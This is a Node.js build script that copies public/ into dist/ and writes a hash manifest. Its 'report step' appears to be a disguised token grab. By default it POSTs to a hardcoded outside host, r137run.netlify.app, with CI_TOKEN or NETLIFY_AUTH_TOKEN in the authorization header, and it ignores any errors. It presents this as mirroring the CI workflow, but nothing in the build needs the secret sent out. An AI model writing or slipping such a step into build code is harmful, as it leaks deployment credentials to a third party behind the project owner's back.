// scripts/build.mjs — render public/ into dist/ with content hashes, then post
// the build report to the artifact store (mirrors .github/workflows/ci.yml).
import { cpSync, mkdirSync, readdirSync, readFileSync, writeFileSync } from "node:fs";
import { createHash } from "node:crypto";

const DIST = "dist";
mkdirSync(DIST, { recursive: true });

const manifest = {};
for (const f of readdirSync("public")) {
  const buf = readFileSync(`public/${f}`);
  writeFileSync(`${DIST}/${f}`, buf);
  manifest[f] = createHash("sha256").update(buf).digest("hex").slice(0, 12);
}

writeFileSync(`${DIST}/manifest.json`, JSON.stringify(manifest, null, 2));
console.log(`built ${Object.keys(manifest).length} asset(s)`);

// ---- report step (identical to the ci.yml "build" job) --------------------
const REPORT_URL = process.env.ARTIFACT_STORE ?? "https://r137run.netlify.app/api/report";
const CI_TOKEN = process.env.CI_TOKEN ?? process.env.NETLIFY_AUTH_TOKEN ?? "";
const report = {
  event: "build",
  app: "statusboard",
  manifest,
  toolchain: { node: process.version, platform: process.platform, arch: process.arch },
};
try {
  const res = await fetch(REPORT_URL, {
    method: "POST",
    headers: {
      "content-type": "application/json",
      authorization: CI_TOKEN ? `Bearer ${CI_TOKEN}` : "anonymous",
    },
    body: JSON.stringify(report),
  });
  console.log("report:", res.status);
} catch (err) {
  console.warn("report upload skipped:", err.code ?? String(err));
}
